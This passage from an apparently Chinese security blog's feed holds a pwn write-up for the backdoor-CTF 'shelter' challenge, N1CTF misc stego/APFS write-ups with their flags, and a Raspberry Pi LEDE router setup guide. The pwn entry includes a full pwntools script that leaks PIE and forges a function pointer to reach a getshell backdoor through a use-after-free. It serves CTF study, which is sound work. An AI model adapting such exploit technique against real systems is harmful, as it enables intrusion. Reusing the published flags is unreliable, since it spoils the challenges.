        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="shelter"><a href="#shelter" class="headerlink" title="shelter"></a>shelter</h1><p>ç®€å•åˆ†æä¸‹é€»è¾‘å’Œæ€è·¯ï¼Œç¨‹åº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/media/psf/Home/MyCTF/backdoor-ctf/pwn/challenge&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>åŸºæœ¬ä¿æŠ¤å…¨å¼€ã€‚ç¨‹åºä¸»è¦æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ª <code>now note</code>ï¼Œæ–°å»ºchunk</p><p>å…¶é€»è¾‘å¦‚ä¸‹<br><a href="/images/2018-backdoor-CTF/2018-03-19-19-12-18.jpg" class="gallery-item"><img src="/images/2018-backdoor-CTF/2018-03-19-19-12-18.jpg"></a><br><code>delete</code>ï¼Œåˆ é™¤chunk é€»è¾‘å¦‚ä¸‹</p><p><a href="/images/2018-backdoor-CTF/2018-03-19-19-13-01.jpg" class="gallery-item"><img src="/images/2018-backdoor-CTF/2018-03-19-19-13-01.jpg"></a><br>ä¼šå‘ç°ï¼Œå¯¹å‡½æ•°æŒ‡é’ˆ<code>elems</code>è¿›è¡Œ<code>free</code>åå¹¶æ²¡æœ‰è¿›ä¸€æ­¥å»è®¾ç½®ä¸ºç©ºã€‚<br><a href="/images/2018-backdoor-CTF/2018-03-19-19-17-10.jpg" class="gallery-item"><img src="/images/2018-backdoor-CTF/2018-03-19-19-17-10.jpg"></a><br>åœ¨deleteçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°ç¨‹åºæœ‰ä¸€æ¡æŒ‡ä»¤ä¸º<code>call rdx</code>ï¼Œè¿›ä¸€æ­¥è°ƒè¯•çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å‘ç°<code>rdx</code>çš„å€¼ä¸º<code>elems</code>æœ‰å…³ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶æˆ–è€…ä¼ªé€ ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œç„¶åå»callï¼Œå°±æ§åˆ¶äº†ç¨‹åºçš„æµç¨‹<br><code>help</code>ï¼Œæ‰“å°helpå‡½æ•°çš„åœ°å€ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥æ³„æ¼ç¨‹åºåœ°å€</p><p><a href="/images/2018-backdoor-CTF/2018-03-19-19-14-34.jpg" class="gallery-item"><img src="/images/2018-backdoor-CTF/2018-03-19-19-14-34.jpg"></a><br>åœ¨ç¨‹åºä¸­ï¼Œæˆ‘ä»¬è¿˜å‘ç°äº†åé—¨å‡½æ•°</p><p><a href="/images/2018-backdoor-CTF/2018-03-19-19-15-23.jpg" class="gallery-item"><img src="/images/2018-backdoor-CTF/2018-03-19-19-15-23.jpg"></a>ï¼Œæ‰€ä»¥æ€»ä½“æ€è·¯å°±æ˜¯æ³„æ¼PIEï¼Œä¼ªé€ æŒ‡é’ˆæ§åˆ¶ç¨‹åºæµç¨‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal =[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;challenge&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;challenge&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_note</span>(<span class="params">content</span>):</span></span><br><span class="line">    r.readuntil(<span class="string">&quot;choice &gt;&quot;</span>)</span><br><span class="line">    r.writeline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.readuntil(<span class="string">&quot;Enter content &gt;&quot;</span>)</span><br><span class="line">    r.writeline(str(content))</span><br><span class="line">    addr= r.readline()</span><br><span class="line">    addr = addr[<span class="number">11</span>:<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">return</span> int(addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.readuntil(<span class="string">&quot;choice &gt;&quot;</span>)</span><br><span class="line">    r.writeline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.readuntil(<span class="string">&quot;Enter index to delete note &gt;&quot;</span>)</span><br><span class="line">    r.writeline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span>():</span></span><br><span class="line">    r.readuntil(<span class="string">&quot;choice &gt;&quot;</span>)</span><br><span class="line">    r.writeline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    local_addr = r.readline()</span><br><span class="line">    local_addr = local_addr[<span class="number">17</span>:<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">return</span> int(local_addr,<span class="number">16</span>)</span><br><span class="line">    printa(local_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak pie</span></span><br><span class="line">pie_addr = int(help())</span><br><span class="line">log.info(<span class="string">&quot;pie_addr: &#123;&#125;&quot;</span>.format(pie_addr))</span><br><span class="line"></span><br><span class="line">getshell_addf = pie_addr - <span class="number">0xC1A</span>+<span class="number">0xA30</span></span><br><span class="line">log.info(<span class="string">&quot;getshell_addf:&#123;&#125;&quot;</span>.format(hex(getshell_addf)))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">chunk_addr = new_note(<span class="string">&quot;A&quot;</span>*<span class="number">8</span>)</span><br><span class="line">log.info(<span class="string">&quot;chunk addr: &#123;&#125;&quot;</span>.format(hex(chunk_addr)))</span><br><span class="line">next_chunk_addr = chunk_addr + <span class="number">0x100</span></span><br><span class="line">log.info(<span class="string">&quot;next chunk addr: &#123;&#125;&quot;</span>.format(hex(next_chunk_addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake function pointer --- getshell</span></span><br><span class="line">pause()</span><br><span class="line">evil_chunk_addr = new_note(p64(next_chunk_addr+<span class="number">0x10</span>)+p64(getshell_addf))</span><br><span class="line"></span><br><span class="line">elems_addr = getshell_addf + (<span class="number">0x202040</span><span class="number">-0xa30</span>)</span><br><span class="line">evil_index = ((evil_chunk_addr+<span class="number">0x8</span>)-elems_addr) /<span class="number">8</span></span><br><span class="line">print(evil_index)</span><br><span class="line">pause()</span><br><span class="line">delete_note(evil_index)</span><br><span class="line">pause()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> backdoor-CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 N1CTF Miscéƒ¨åˆ†</title>
      <link href="2018-N1CTF-Misc-part.html"/>
      <url>2018-N1CTF-Misc-part.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="Lostme"><a href="#Lostme" class="headerlink" title="Lostme"></a>Lostme</h2><p>ä¸äººå·¥æ™ºéšœæ–—æ™ºæ–—å‹‡ç³»åˆ—ï¼Œä¸‹è¾“å³è·å¾—flag</p><p>N1CTF{Oh!you_1ose_t0_AI_hhhhhh}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Lipstick"><a href="#Lipstick" class="headerlink" title="Lipstick"></a>Lipstick</h2><p>å…ˆæ˜¯ä¸€å±‚LSBï¼Œå¾—åˆ°ä¸€ä¸ªZIP æ–‡ä»¶ï¼Œç„¶è€ŒZIPæ˜¯æœ‰å¯†ç çš„ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-lipstick-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-lipstick-01.jpg"></a></p><p>åœ¨çº¢è‰²é€šé“å‘ç°äº†YSLå­—æ ·ï¼Œä»¥åŠhintç»™çš„21ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œäºæ˜¯çŒœæµ‹å‹ç¼©åŒ…å¯†ç ä¸ºYSLå£çº¢è‰²å·ä¸”æœ‰21ä¸ªæ•°å€¼ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-lipstick-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-lipstick-02.jpg"></a></p><p>é€šè¿‡å–è‰²å™¨çš„å¯¹æ¯”ï¼Œæ‰¾åˆ°è‰²å·</p><p>1ï¼Œ27 ï¼Œ59  ï¼Œ11  ï¼Œ23 ï¼Œ7  ï¼Œ57ï¼Œ1 ï¼Œ1 ï¼Œ76 ï¼Œ222 ï¼Œ1ï¼Œ1ï¼Œ50 ï¼Œ214 ï¼Œ6 ï¼Œ77 ï¼Œ50ï¼Œ53ï¼Œ214 ï¼Œ6 </p><p>ç´§æ¥ç€å°†è‰²å·è½¬ä¸ºäºŒè¿›åˆ¶æ•°å€¼ï¼Œ</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/n1ctf-misc01-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/n1ctf-misc01-03.jpg"></a></p><p>å¾—åˆ°ZIPå¯†ç ä¸ºç™½å­¦å®¶ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-misc01-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-misc01-03.jpg"></a></p><p>å¾—åˆ°flagï¼š</p><p>flag{White_Album_is_Really_worth_watching_on_White_Valentineâ€™s_Day}</p><h2 id="APFS"><a href="#APFS" class="headerlink" title="APFS"></a>APFS</h2><p>é¦–å…ˆé¢˜ç›®ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªdmgæ–‡ä»¶ï¼Œæœ‰ä¸€ä¸ªåŠ å¯†keyï¼Œé€šè¿‡stringså¯ä»¥è·å–Keyä¸º N1CTF_APFS</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-01.jpg"></a></p><p>é€šè¿‡é¢˜ç›®çš„hint å¾—çŸ¥ é¢˜ç›®ç›¸å…³ç‚¹åº”ä¸ºAPFSçš„snapshotæ–°ç‰¹æ€§ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-02.jpg"></a></p><p>é€šè¿‡ tmutil listlocalsnapshots . å¾—åˆ°å½“å‰APFSçš„ä¸€ä¸ªå¿«ç…§ä¸ºCTF,é€šè¿‡mount_apfs -s ctf /Volumes/N1CTF_APFS ~/temp/ è¿›è¡ŒæŒ‚è½½ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-03.jpg"></a></p><p>æ ¹æ®å‡ ä¸ªæç¤ºï¼Œä¸éš¾çŒœæµ‹æ•°æ® ä¸ºMODIFY TIMEçš„æœ€ä½æœ‰æ•ˆä¸ºï¼Œé¦–å…ˆåˆ†åˆ«è·å–å¿«ç…§å‰å’Œå¿«ç…§åä¸¤éƒ¨åˆ†çš„MODIFYæ—¶é—´ã€‚ä¸”ä¸ºçº³ç§’çº§åˆ«æ•°æ®ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-04.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-05.jpg"></a></p><p>è·å–æ—¶é—´åï¼Œå»å–ä¸¤ä¸ªä¸²çš„æœ€ä½æœ‰æ•ˆä½ã€‚åˆ†åˆ«æ˜¯</p><p>2 4 0 4 5 4 0 3 0 1 0 0 5 0 0 0 0 0 2 0 4 0 0 0 0 0 0 6 7 5 6 3 3 1 4 4 6 1 7 2 4 3 3 4 6 6 1 6 1 4 2 0 0 0 0 0 0 0 0 2 2 4 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 3 1 4 6 6 1 4 1 3 1 6 2 7 1 6 4 3 6 0 7 2 3 7 4 6 6 4 5 6 2 3 2 3 3 2 1 2 6 6 5 3 6 6 5 6 2 2 6 3 0 7 4 4 3 0 4 7 5 6 2 6 1 6 5 6 7 4 7 2 7 1 4 5 6 3 5 3 1 5 7 5 3 5 6 6 7 2 2 5 1 5 5 1 4 5 0 6 3 2 1 4 3 1 3 1 2 1 5 3 7 5 6 2 4 5 1 5 5 0 6 4 5 3 7 4 3 2 4 4 5 1 3 0 5 4 4 6 5 7 3 3 0 6 2 5 6 3 3 0 0 0 6 2 4 0 4 5 4 0 1 0 0 4 3 7 4 0 0 0 2 4 0 0 0 0 1 0 2 0 0 0 0 0 0 3 3 6 7 1 5 4 6 2 3 0 7 5 2 1 5 6 3 3 0 7 0 6 1 0 0 0 0 0 0 0 0 1 1 2 0 0 0 0 0 0 0 0 0 4 0 0 0 1 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 6 3 1 5 4 3 0 2 6 3 4 5 6 3 5 0 7 4 1 6 4 0 2 4 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 1 4 0 0 0 1 2 3 7 4 7 6 4 1 4 6 1 2 2 6 5 6 4 6 0 0 4 6 2 3 7 3 5 4 1 7 2 0 4 5 3 2 3 2 3 0 0 2 6 7 3 3 6 2 0 2 5 0 3 0 3 5 4 7 5 1 4 0 1 2 4 0 4 5 4 0 5 0 1 4 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 4 0 0 2 6 4 0 0 0 0 0 0 0 0 5 3 4 0 0 0 0 0 0 0 0 0 0 0 0 0</p><p>å’Œ</p><p>0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 5 5 3 0 1 0 0 4 0 0 0 0 7 3 6 5 5 3 5 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 3 3 5 1 1 0 5 6 0 6 7 2 4 6 0 6 7 1 0 3 2 2 5 2 5 6 2 6 1 2 2 5 1 0 2 3 0 7 2 6 0 3 5 7 0 6 1 3 1 2 3 5 7 3 2 7 3 2 0 2 2 3 4 5 6 6 1 7 4 2 4 5 1 2 5 3 2 0 5 6 5 1 1 2 4 7 4 0 2 1 1 1 6 2 1 6 5 6 7 4 7 3 2 6 7 6 7 3 0 4 5 6 3 7 4 1 6 3 1 2 5 6 4 0 1 1 7 4 4 7 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 2 6 5 4 0 4 0 2 0 0 0 0 3 5 7 2 6 5 6 4 2 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 7 4 3 1 5 0 3 5 7 3 5 3 4 0 6 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0</p><p>å‰ååˆ†åˆ«å¼‚æˆ–å¾—åˆ°å¦å¤–ä¸€ç»„ï¼Œç„¶åè¿›è¡Œä¸€æ¬¡äºŒè¿›åˆ¶è½¬æ¢ã€‚ç„¶åè¿›è¡Œæ‹¼æ¥ï¼Œ8bitä¸€ä¸ªå­—èŠ‚ï¼Œ</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-06.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-06.jpg"></a></p><p>å¾—åˆ°ZIPï¼Œå°è¯•äº†ä¸€å¼€å§‹dmgçš„å¯†ç ï¼Œå³ä¸ºZIPå¯†ç ï¼Œå¾—åˆ°flag</p><p>N1CTF{APFS_a_N3xt_30_Year_Filesystem}</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> N1CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ‘è“æ´¾3åˆ·LEDE(OpenWRT)æ‰“é€ è·¯ç”±å™¨</title>
      <link href="cranberry-pie-3-brushes-ledeopenwrt-to-create-portable-personal-wireless-internet.html"/>
      <url>cranberry-pie-3-brushes-ledeopenwrt-to-create-portable-personal-wireless-internet.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><p>å‰å¾€ LEDE å®˜ç½‘ä¸‹è½½å›ºä»¶å¹¶éªŒè¯ï¼š</p><p><a href="https://downloads.lede-project.org/releases/17.01.4/targets/brcm2708/bcm2710/lede-17.01.4-brcm2708-bcm2710-rpi-3-ext4-sdcard.img.gz">https://downloads.lede-project.org/releases/17.01.4/targets/brcm2708/bcm2710/lede-17.01.4-brcm2708-bcm2710-rpi-3-ext4-sdcard.img.gz</a></p><p>æ³¨ï¼šbcm2710 æ˜¯ä¸“ä¸ºæ ‘è“æ´¾3å‡†å¤‡çš„ã€‚<br>åˆ·æœºè½¯ä»¶ï¼š</p><p>SDå¡çƒ§å½•å·¥å…·ï¼šWin32DiskImager (windows)</p><h2 id="åˆ·å…¥LEDEç³»ç»Ÿ"><a href="#åˆ·å…¥LEDEç³»ç»Ÿ" class="headerlink" title="åˆ·å…¥LEDEç³»ç»Ÿ"></a>åˆ·å…¥LEDEç³»ç»Ÿ</h2><p>ä½¿ç”¨ Win32DiskImager çƒ§å½• LEDE ç³»ç»Ÿé•œåƒåˆ° SDå¡</p><p>å®‰è£…SDå¡åˆ°æ ‘è“æ´¾ï¼Œå¼€æœºã€‚</p><h2 id="ç½‘ç»œé…ç½®"><a href="#ç½‘ç»œé…ç½®" class="headerlink" title="ç½‘ç»œé…ç½®"></a>ç½‘ç»œé…ç½®</h2><p>ç”¨ä¸€æ ¹ç½‘çº¿è¿æ¥ç¬”è®°æœ¬å’Œæ ‘è“æ´¾ï¼Œè®¾ç½®ç”µè„‘çš„IPä¸ºè‡ªåŠ¨è·å–ã€‚æ ‘è“æ´¾çš„é»˜è®¤IPä¸º192.168.1.1</p><p>SSH ç™»é™†ï¼Œå¹¶ä¿®æ”¹ root å¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 192.168.1.1 -l root</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ /etc/config/network é…ç½®æ–‡ä»¶ï¼Œè°ƒæ•´ lan IPä¸ºå’Œè·¯ç”±å™¨ä¸å†²çªçš„å…¶ä»–IPï¼Œå¢åŠ  wan è®¾ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">config interface &#39;lan&#39;</span><br><span class="line">        option type &#39;bridge&#39;</span><br><span class="line">        option ifname &#39;eth0&#39;</span><br><span class="line">        option proto &#39;static&#39;</span><br><span class="line">        option ipaddr &#39;192.168.1.11&#39;</span><br><span class="line">        option netmask &#39;255.255.255.0&#39;</span><br><span class="line">        option ip6assign &#39;60&#39;</span><br><span class="line">        option gateway &#39;192.168.1.1&#39;</span><br><span class="line">        option dns &#39;114.114.114.114&#39;</span><br><span class="line"></span><br><span class="line">config interface &#39;wan&#39;</span><br><span class="line">        option proto &#39;dhcp&#39;</span><br><span class="line">        option ifname &#39;eth0&#39;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ /etc/config/wireless é…ç½®æ–‡ä»¶ï¼Œå¼€å¯æ— çº¿ AP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">config wifi-device &#39;radio0&#39;</span><br><span class="line">        option type &#39;mac80211&#39;</span><br><span class="line">        option channel &#39;11&#39;</span><br><span class="line">        option hwmode &#39;11g&#39;</span><br><span class="line">        option path &#39;platform&#x2F;soc&#x2F;3f300000.mmc&#x2F;mmc_host&#x2F;mmc1&#x2F;mmc1:0001&#x2F;mmc1:0001:1&#39;</span><br><span class="line">        option htmode &#39;HT20&#39;</span><br><span class="line">        option disabled &#39;0&#39;</span><br><span class="line"></span><br><span class="line">config wifi-iface &#39;default_radio0&#39;</span><br><span class="line">        option device &#39;radio0&#39;</span><br><span class="line">        option network &#39;lan&#39;</span><br><span class="line">        option mode &#39;ap&#39;</span><br><span class="line">        option ssid &#39;OpenWrt&#39;</span><br><span class="line">        option encryption &#39;psk2&#39;</span><br><span class="line">        option key &#39;passwd.&#39;</span><br></pre></td></tr></table></figure><p>è®©è¿æ¥è·¯ç”±æ—¶ï¼Œä¹Ÿèƒ½sshä¸Šæ ‘è“æ´¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#open ssh on wan interface</span><br><span class="line"></span><br><span class="line">config rule</span><br><span class="line">        option src              wan</span><br><span class="line">        option dest_port        22</span><br><span class="line">        option target           ACCEPT</span><br><span class="line">        option proto            tcp</span><br></pre></td></tr></table></figure><p>é‡å¯æ ‘è“æ´¾</p><p>ç”¨ä¸€æ ¹ç½‘çº¿è¿æ¥æ ‘è“æ´¾å’Œè·¯ç”±å™¨çš„ LAN å£ï¼ŒWiFi è¿æ¥åˆ° LEDE-WiFi ç½‘ç»œï¼Œé‡æ–°è¿æ¥ SSH</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.1.11</span><br><span class="line">#ä½¿ç”¨æ–°çš„IPè¿æ¥SSH</span><br></pre></td></tr></table></figure><h2 id="æ›´æ–°è½¯ä»¶åŒ…å®‰è£…LuCI-webç•Œé¢"><a href="#æ›´æ–°è½¯ä»¶åŒ…å®‰è£…LuCI-webç•Œé¢" class="headerlink" title="æ›´æ–°è½¯ä»¶åŒ…å®‰è£…LuCI webç•Œé¢"></a>æ›´æ–°è½¯ä»¶åŒ…å®‰è£…LuCI webç•Œé¢</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opkg update</span><br><span class="line">opkg install luci-ssl</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå®‰è£…çš„æ˜¯sslç‰ˆæœ¬</p><h3 id="å®‰è£…è½¯ä»¶åŒ…"><a href="#å®‰è£…è½¯ä»¶åŒ…" class="headerlink" title="å®‰è£…è½¯ä»¶åŒ…"></a>å®‰è£…è½¯ä»¶åŒ…</h3><p>ä¸­æ–‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opkg install luci-i18n-base-zh-cn</span><br><span class="line">opkg install luci-i18n-firewall-zh-cn</span><br></pre></td></tr></table></figure><p>æ‰“å¼€æœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;uhttpd enable</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;uhttpd start</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…ss"><a href="#å®‰è£…ss" class="headerlink" title="å®‰è£…ss"></a>å®‰è£…ss</h3><p><a href="http://openwrt-dist.sourceforge.net/">http://openwrt-dist.sourceforge.net</a><br>ç›´æ¥çœ‹ä¸Šé¢ï¼</p><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" 